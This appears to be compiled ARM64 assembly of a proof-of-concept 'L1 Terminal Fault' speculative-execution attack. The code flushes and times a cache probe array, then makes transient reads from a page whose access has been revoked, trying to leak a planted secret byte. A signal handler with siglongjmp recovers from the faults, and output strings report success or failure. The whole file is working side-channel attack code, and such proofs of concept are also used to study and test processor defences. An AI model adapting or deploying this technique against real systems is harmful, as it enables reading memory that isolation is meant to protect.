	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 15, 5
	.globl	_flush_probe_array              ; -- Begin function flush_probe_array
	.p2align	2
_flush_probe_array:                     ; @flush_probe_array
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
	str	wzr, [sp, #12]
	b	LBB0_1
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #12]
	subs	w8, w8, #256
	b.ge	LBB0_4
	b	LBB0_2
LBB0_2:                                 ;   in Loop: Header=BB0_1 Depth=1
	ldr	w8, [sp, #12]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x8, x8, w9, sxtw
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	b	LBB0_3
LBB0_3:                                 ;   in Loop: Header=BB0_1 Depth=1
	ldr	w8, [sp, #12]
	add	w8, w8, #1
	str	w8, [sp, #12]
	b	LBB0_1
LBB0_4:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	add	sp, sp, #16
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_mfence                     ; -- Begin function _mm_mfence
	.p2align	2
__mm_mfence:                            ; @_mm_mfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_lfence                     ; -- Begin function _mm_lfence
	.p2align	2
__mm_lfence:                            ; @_mm_lfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_clflush                    ; -- Begin function _mm_clflush
	.p2align	2
__mm_clflush:                           ; @_mm_clflush
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
	ldr	x8, [sp, #8]
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	sp, sp, #16
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_measure_access_time            ; -- Begin function measure_access_time
	.p2align	2
_measure_access_time:                   ; @measure_access_time
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #48
	stp	x29, x30, [sp, #32]             ; 16-byte Folded Spill
	add	x29, sp, #32
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	x0, [x29, #-8]
	bl	_rdtsc
	str	x0, [sp, #16]
	ldur	x8, [x29, #-8]
	ldrb	w8, [x8]
	strb	w8, [sp, #7]
	bl	__mm_mfence
	bl	_rdtsc
	str	x0, [sp, #8]
	ldr	x8, [sp, #8]
	ldr	x9, [sp, #16]
	subs	x0, x8, x9
	ldp	x29, x30, [sp, #32]             ; 16-byte Folded Reload
	add	sp, sp, #48
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_benign_target                  ; -- Begin function benign_target
	.p2align	2
_benign_target:                         ; @benign_target
	.cfi_startproc
; %bb.0:
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_common_init                    ; -- Begin function common_init
	.p2align	2
_common_init:                           ; @common_init
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	mov	x1, #16384                      ; =0x4000
	adrp	x0, _probe_array@GOTPAGE
	ldr	x0, [x0, _probe_array@GOTPAGEOFF]
	bl	_bzero
	stur	wzr, [x29, #-4]
	b	LBB6_1
LBB6_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-4]
	subs	w8, w8, #4, lsl #12             ; =16384
	b.ge	LBB6_4
	b	LBB6_2
LBB6_2:                                 ;   in Loop: Header=BB6_1 Depth=1
	ldursw	x9, [x29, #-4]
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x9, x8, x9
	mov	w8, #1                          ; =0x1
	strb	w8, [x9]
	b	LBB6_3
LBB6_3:                                 ;   in Loop: Header=BB6_1 Depth=1
	ldur	w8, [x29, #-4]
	add	w8, w8, #64
	stur	w8, [x29, #-4]
	b	LBB6_1
LBB6_4:
	bl	__mm_mfence
	bl	_flush_probe_array
	bl	__mm_mfence
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_perform_measurement            ; -- Begin function perform_measurement
	.p2align	2
_perform_measurement:                   ; @perform_measurement
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #112
	stp	x29, x30, [sp, #96]             ; 16-byte Folded Spill
	add	x29, sp, #96
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	sturb	w0, [x29, #-5]
	stur	x1, [x29, #-16]
	adrp	x0, l_.str@PAGE
	add	x0, x0, l_.str@PAGEOFF
	bl	_printf
	mov	w8, #-1                         ; =0xffffffff
	stur	w8, [x29, #-20]
	mov	x8, #-1                         ; =0xffffffffffffffff
	stur	x8, [x29, #-32]
	mov	w8, #100                        ; =0x64
	stur	w8, [x29, #-36]
	stur	wzr, [x29, #-40]
	b	LBB7_1
LBB7_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-40]
	subs	w8, w8, #256
	b.ge	LBB7_8
	b	LBB7_2
LBB7_2:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldur	w8, [x29, #-40]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x8, x8, w9, sxtw
	str	x8, [sp, #48]
	ldr	x0, [sp, #48]
	bl	_measure_access_time
	str	x0, [sp, #40]
	ldr	x8, [sp, #40]
	ldursw	x9, [x29, #-36]
	subs	x8, x8, x9
	b.ge	LBB7_6
	b	LBB7_3
LBB7_3:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldur	x8, [x29, #-32]
	adds	x8, x8, #1
	b.eq	LBB7_5
	b	LBB7_4
LBB7_4:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldr	x8, [sp, #40]
	ldur	x9, [x29, #-32]
	subs	x8, x8, x9
	b.ge	LBB7_6
	b	LBB7_5
LBB7_5:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldr	x8, [sp, #40]
	stur	x8, [x29, #-32]
	ldur	w8, [x29, #-40]
	stur	w8, [x29, #-20]
	b	LBB7_6
LBB7_6:                                 ;   in Loop: Header=BB7_1 Depth=1
	b	LBB7_7
LBB7_7:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldur	w8, [x29, #-40]
	add	w8, w8, #1
	stur	w8, [x29, #-40]
	b	LBB7_1
LBB7_8:
	ldur	w8, [x29, #-20]
	adds	w8, w8, #1
	b.eq	LBB7_12
	b	LBB7_9
LBB7_9:
	ldur	x11, [x29, #-16]
	ldur	w12, [x29, #-20]
	ldur	w8, [x29, #-20]
	mov	x10, x8
	ldur	x8, [x29, #-32]
	mov	x9, sp
	str	x11, [x9]
                                        ; implicit-def: $x11
	mov	x11, x12
	sxtb	x11, w11
	str	x11, [x9, #8]
	str	x10, [x9, #16]
	str	x8, [x9, #24]
	adrp	x0, l_.str.1@PAGE
	add	x0, x0, l_.str.1@PAGEOFF
	bl	_printf
	ldur	w8, [x29, #-20]
	ldurb	w9, [x29, #-5]
	subs	w8, w8, w9
	b.ne	LBB7_11
	b	LBB7_10
LBB7_10:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.2@PAGE
	add	x0, x0, l_.str.2@PAGEOFF
	bl	_printf
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB7_13
LBB7_11:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.3@PAGE
	add	x0, x0, l_.str.3@PAGEOFF
	bl	_printf
	stur	wzr, [x29, #-4]
	b	LBB7_13
LBB7_12:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.4@PAGE
	add	x0, x0, l_.str.4@PAGEOFF
	bl	_printf
	stur	wzr, [x29, #-4]
	b	LBB7_13
LBB7_13:
	ldur	w0, [x29, #-4]
	ldp	x29, x30, [sp, #96]             ; 16-byte Folded Reload
	add	sp, sp, #112
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_sigsegv_handler_l1tf           ; -- Begin function sigsegv_handler_l1tf
	.p2align	2
_sigsegv_handler_l1tf:                  ; @sigsegv_handler_l1tf
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	w0, [x29, #-4]
	mov	w0, #11                         ; =0xb
	mov	x1, #0                          ; =0x0
	bl	_signal
	adrp	x0, _jmpbuf_l1tf@PAGE
	add	x0, x0, _jmpbuf_l1tf@PAGEOFF
	mov	w1, #1                          ; =0x1
	bl	_siglongjmp
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #64
	stp	x29, x30, [sp, #48]             ; 16-byte Folded Spill
	add	x29, sp, #48
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	wzr, [x29, #-4]
	bl	_common_init
	adrp	x0, l_.str.5@PAGE
	add	x0, x0, l_.str.5@PAGEOFF
	bl	_printf
	bl	_getpagesize
                                        ; implicit-def: $x8
	mov	x8, x0
	sxtw	x8, w8
	stur	x8, [x29, #-16]
	ldur	x1, [x29, #-16]
	mov	x0, #0                          ; =0x0
	mov	w2, #3                          ; =0x3
	mov	w3, #4098                       ; =0x1002
	mov	w4, #-1                         ; =0xffffffff
	mov	x5, #0                          ; =0x0
	bl	_mmap
	adrp	x8, _g_l1tf_secret_page@PAGE
	str	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldr	x8, [x8, _g_l1tf_secret_page@PAGEOFF]
	adds	x8, x8, #1
	b.ne	LBB9_2
	b	LBB9_1
LBB9_1:
	adrp	x0, l_.str.6@PAGE
	add	x0, x0, l_.str.6@PAGEOFF
	bl	_perror
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB9_19
LBB9_2:
	adrp	x8, _secret_l1tf_byte@PAGE
	ldrb	w8, [x8, _secret_l1tf_byte@PAGEOFF]
	adrp	x9, _g_l1tf_secret_page@PAGE
	ldr	x9, [x9, _g_l1tf_secret_page@PAGEOFF]
	strb	w8, [x9, #256]
	mov	w0, #11                         ; =0xb
	adrp	x1, _sigsegv_handler_l1tf@PAGE
	add	x1, x1, _sigsegv_handler_l1tf@PAGEOFF
	bl	_signal
	adds	x8, x0, #1
	b.ne	LBB9_4
	b	LBB9_3
LBB9_3:
	adrp	x0, l_.str.7@PAGE
	add	x0, x0, l_.str.7@PAGEOFF
	bl	_perror
	adrp	x8, _g_l1tf_secret_page@PAGE
	ldr	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldur	x1, [x29, #-16]
	bl	_munmap
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB9_19
LBB9_4:
	adrp	x8, _g_l1tf_secret_page@PAGE
	ldr	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldur	x1, [x29, #-16]
	mov	w2, #0                          ; =0x0
	bl	_mprotect
	adds	w8, w0, #1
	b.ne	LBB9_6
	b	LBB9_5
LBB9_5:
	adrp	x0, l_.str.8@PAGE
	add	x0, x0, l_.str.8@PAGEOFF
	bl	_perror
	adrp	x8, _g_l1tf_secret_page@PAGE
	ldr	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldur	x1, [x29, #-16]
	bl	_munmap
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB9_19
LBB9_6:
	adrp	x0, l_.str.9@PAGE
	add	x0, x0, l_.str.9@PAGEOFF
	bl	_printf
	adrp	x0, _jmpbuf_l1tf@PAGE
	add	x0, x0, _jmpbuf_l1tf@PAGEOFF
	mov	w1, #1                          ; =0x1
	bl	_sigsetjmp
	cbnz	w0, LBB9_8
	b	LBB9_7
LBB9_7:
	adrp	x8, _g_l1tf_secret_page@PAGE
	str	x8, [sp, #16]                   ; 8-byte Folded Spill
	ldr	x8, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldrb	w8, [x8, #256]
	sturb	w8, [x29, #-17]
	ldurb	w8, [x29, #-17]
	adrp	x0, l_.str.10@PAGE
	add	x0, x0, l_.str.10@PAGEOFF
	bl	_printf
	ldr	x8, [sp, #16]                   ; 8-byte Folded Reload
	ldr	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldur	x1, [x29, #-16]
	bl	_munmap
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB9_19
LBB9_8:
	adrp	x0, l_.str.11@PAGE
	add	x0, x0, l_.str.11@PAGEOFF
	bl	_printf
	b	LBB9_9
LBB9_9:
	adrp	x0, l_.str.12@PAGE
	add	x0, x0, l_.str.12@PAGEOFF
	bl	_printf
	adrp	x8, _secret_l1tf_byte@PAGE
	ldrb	w11, [x8, _secret_l1tf_byte@PAGEOFF]
	ldrb	w10, [x8, _secret_l1tf_byte@PAGEOFF]
	mov	x9, sp
                                        ; implicit-def: $x8
	mov	x8, x11
	str	x8, [x9]
                                        ; implicit-def: $x8
	mov	x8, x10
	str	x8, [x9, #8]
	adrp	x0, l_.str.13@PAGE
	add	x0, x0, l_.str.13@PAGEOFF
	bl	_printf
	str	wzr, [sp, #24]
	b	LBB9_10
LBB9_10:                                ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #24]
	subs	w8, w8, #500
	b.ge	LBB9_18
	b	LBB9_11
LBB9_11:                                ;   in Loop: Header=BB9_10 Depth=1
	bl	_flush_probe_array
	adrp	x0, _jmpbuf_l1tf@PAGE
	add	x0, x0, _jmpbuf_l1tf@PAGEOFF
	mov	w1, #1                          ; =0x1
	bl	_sigsetjmp
	cbnz	w0, LBB9_13
	b	LBB9_12
LBB9_12:                                ;   in Loop: Header=BB9_10 Depth=1
	adrp	x8, _g_l1tf_secret_page@PAGE
	ldr	x8, [x8, _g_l1tf_secret_page@PAGEOFF]
	add	x8, x8, #256
	adrp	x9, _probe_array@GOTPAGE
	ldr	x9, [x9, _probe_array@GOTPAGEOFF]
	; InlineAsm Start
Ltmp2:
	ldr	x0, [x8]
	lsl	x0, x0, #12
	ldr	x1, [x9, x0]
Ltmp3:

	; InlineAsm End
	b	LBB9_14
LBB9_13:                                ;   in Loop: Header=BB9_10 Depth=1
	bl	__mm_lfence
	b	LBB9_14
LBB9_14:                                ;   in Loop: Header=BB9_10 Depth=1
	adrp	x8, _secret_l1tf_byte@PAGE
	ldrb	w0, [x8, _secret_l1tf_byte@PAGEOFF]
	adrp	x1, l_.str.14@PAGE
	add	x1, x1, l_.str.14@PAGEOFF
	bl	_perform_measurement
	cbz	w0, LBB9_16
	b	LBB9_15
LBB9_15:
	adrp	x8, _g_l1tf_secret_page@PAGE
	ldr	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldur	x1, [x29, #-16]
	bl	_munmap
	stur	wzr, [x29, #-4]
	b	LBB9_19
LBB9_16:                                ;   in Loop: Header=BB9_10 Depth=1
	b	LBB9_17
LBB9_17:                                ;   in Loop: Header=BB9_10 Depth=1
	ldr	w8, [sp, #24]
	add	w8, w8, #1
	str	w8, [sp, #24]
	b	LBB9_10
LBB9_18:
	adrp	x0, l_.str.15@PAGE
	add	x0, x0, l_.str.15@PAGEOFF
	bl	_printf
	adrp	x8, _secret_l1tf_byte@PAGE
	ldrb	w10, [x8, _secret_l1tf_byte@PAGEOFF]
	mov	x9, sp
                                        ; implicit-def: $x8
	mov	x8, x10
	str	x8, [x9]
	adrp	x0, l_.str.16@PAGE
	add	x0, x0, l_.str.16@PAGEOFF
	bl	_printf
	adrp	x8, _g_l1tf_secret_page@PAGE
	ldr	x0, [x8, _g_l1tf_secret_page@PAGEOFF]
	ldur	x1, [x29, #-16]
	bl	_munmap
	stur	wzr, [x29, #-4]
	b	LBB9_19
LBB9_19:
	ldur	w0, [x29, #-4]
	ldp	x29, x30, [sp, #48]             ; 16-byte Folded Reload
	add	sp, sp, #64
	ret
	.cfi_endproc
                                        ; -- End function
	.p2align	2                               ; -- Begin function rdtsc
_rdtsc:                                 ; @rdtsc
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	mov	w0, #6                          ; =0x6
	mov	x1, sp
	bl	_clock_gettime
	ldr	x8, [sp]
	mov	x9, #51712                      ; =0xca00
	movk	x9, #15258, lsl #16
	mul	x8, x8, x9
	ldr	x9, [sp, #8]
	add	x0, x8, x9
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.comm	_probe_array,16384,0            ; @probe_array
	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"Measuring cache timings...\n"

l_.str.1:                               ; @.str.1
	.asciz	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld ns\n"

l_.str.2:                               ; @.str.2
	.asciz	"SUCCESS! Leaked the actual %s.\n"

l_.str.3:                               ; @.str.3
	.asciz	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"

l_.str.4:                               ; @.str.4
	.asciz	"No %s leaked or could not detect leakage.\n"

	.section	__DATA,__data
	.globl	_secret_l1tf_byte               ; @secret_l1tf_byte
_secret_l1tf_byte:
	.byte	76                              ; 0x4c

	.globl	_g_l1tf_secret_page             ; @g_l1tf_secret_page
.zerofill __DATA,__common,_g_l1tf_secret_page,8,3
.zerofill __DATA,__bss,_jmpbuf_l1tf,196,2 ; @jmpbuf_l1tf
	.section	__TEXT,__cstring,cstring_literals
l_.str.5:                               ; @.str.5
	.asciz	"\n--- Running L1 Terminal Fault (L1TF) Demo (ARM64-compatible) ---\n"

l_.str.6:                               ; @.str.6
	.asciz	"mmap"

l_.str.7:                               ; @.str.7
	.asciz	"signal"

l_.str.8:                               ; @.str.8
	.asciz	"mprotect"

l_.str.9:                               ; @.str.9
	.asciz	"Page is now unmapped. Testing signal handler...\n"

l_.str.10:                              ; @.str.10
	.asciz	"ERROR: Page is still accessible!\n"

l_.str.11:                              ; @.str.11
	.asciz	"Signal handler working correctly. Starting L1TF attack...\n"

l_.str.12:                              ; @.str.12
	.asciz	"Attempting L1TF-style transient read from unmapped page...\n"

l_.str.13:                              ; @.str.13
	.asciz	"Secret byte: %c (0x%02x)\n"

l_.str.14:                              ; @.str.14
	.asciz	"L1TF secret"

l_.str.15:                              ; @.str.15
	.asciz	"Failed to leak the L1TF secret byte.\n"

l_.str.16:                              ; @.str.16
	.asciz	"Actual secret data: %c\n"

.subsections_via_symbols
